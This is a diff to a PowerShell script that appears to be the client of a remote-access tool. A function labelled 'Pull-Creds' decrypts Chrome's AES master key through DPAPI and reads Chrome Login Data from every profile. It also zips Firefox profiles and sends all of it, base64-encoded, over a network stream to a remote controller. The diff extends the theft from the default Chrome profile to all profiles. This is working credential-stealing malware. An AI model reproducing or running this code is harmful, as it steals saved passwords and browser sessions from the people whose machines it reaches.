@@ -397,23 +397,10 @@ function PortSuggest {
         $ip = (Test-Connection -ComputerName (hostname) -Count 1).Address.IPAddressToString
         Output-Log "[*] Pull-Creds started on $ip"
 
-        # === Chrome: Login Data
-        $chromeData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeData) {
-            Output-Log "[+] Found Chrome Login Data"
-            $b64Login = [Convert]::ToBase64String([IO.File]::ReadAllBytes($chromeData))
-            $out = "[UPLOAD]::chrome_LoginData_$ip.db::" + $b64Login + "::END"
-            $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
-            $global:clientStream.Write($bytes, 0, $bytes.Length)
-            $global:clientStream.Flush()
-            Output-Log "[+] Sent chrome_LoginData_$ip.db"
-        }
-        else {
-            Output-Log "[!] Chrome Login Data not found"
-        }
+        $chromeRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        $localStatePath = Join-Path $chromeRoot "Local State"
 
-        # === Chrome: Расшифровка AES-ключа из Local State
-        $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+        # === Chrome: Расшифровка AES-ключа
         if (Test-Path $localStatePath) {
             Output-Log "[+] Found Chrome Local State"
             $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
@@ -424,14 +411,39 @@ function PortSuggest {
             Add-Type -AssemblyName System.Security
             $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
 
-            $out = "[UPLOAD]::chrome_master_key_$ip.bin::" + [Convert]::ToBase64String($aesKey) + "::END"
-            $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
+            $b64Key = [Convert]::ToBase64String($aesKey)
+            $upload = "[UPLOAD]::chrome_master_key_$ip.bin::$b64Key::END"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($upload)
             $global:clientStream.Write($bytes, 0, $bytes.Length)
             $global:clientStream.Flush()
             Output-Log "[+] Sent chrome_master_key_$ip.bin"
-        }
-        else {
+        } else {
             Output-Log "[!] Chrome Local State not found"
+        }
+
+        # === Chrome: Login Data из всех профилей
+        if (Test-Path $chromeRoot) {
+            $profiles = Get-ChildItem $chromeRoot -Directory | Where-Object {
+                $_.Name -match "^Default$|^Profile \d+$"
+            }
+
+            foreach ($profile in $profiles) {
+                $profileName = $profile.Name
+                $loginPath = Join-Path $profile.FullName "Login Data"
+
+                if (Test-Path $loginPath) {
+                    $b64Login = [Convert]::ToBase64String([IO.File]::ReadAllBytes($loginPath))
+                    $upload = "[UPLOAD]::chrome_LoginData_${profileName}_$ip.db::$b64Login::END"
+                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($upload)
+                    $global:clientStream.Write($bytes, 0, $bytes.Length)
+                    $global:clientStream.Flush()
+                    Output-Log "[+] Sent chrome_LoginData_${profileName}_$ip.db"
+                } else {
+                    Output-Log "[ ] No Login Data in $profileName"
+                }
+            }
+        } else {
+            Output-Log "[!] Chrome User Data folder not found"
         }
 
         # === Firefox: Профили
@@ -444,15 +456,14 @@ function PortSuggest {
                 if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
                 Compress-Archive -Path $profile.FullName -DestinationPath $zipPath -Force
                 $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zipPath))
-                $out = "[UPLOAD]::firefox_profile_$($profile.Name)_$ip.zip::" + $b64 + "::END"
-                $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
+                $upload = "[UPLOAD]::firefox_profile_$($profile.Name)_$ip.zip::$b64::END"
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($upload)
                 $global:clientStream.Write($bytes, 0, $bytes.Length)
                 $global:clientStream.Flush()
                 Output-Log "[+] Sent firefox_profile_$($profile.Name)_$ip.zip"
                 Remove-Item $zipPath -Force
             }
-        }
-        else {
+        } else {
             Output-Log "[!] No Firefox profiles found"
         }
 
@@ -465,6 +476,7 @@ function PortSuggest {
         return $err
     }
 }
+
 
 
     
@@ -682,7 +694,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                           cool                                                                                                                                                                   
+                                           yeah                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
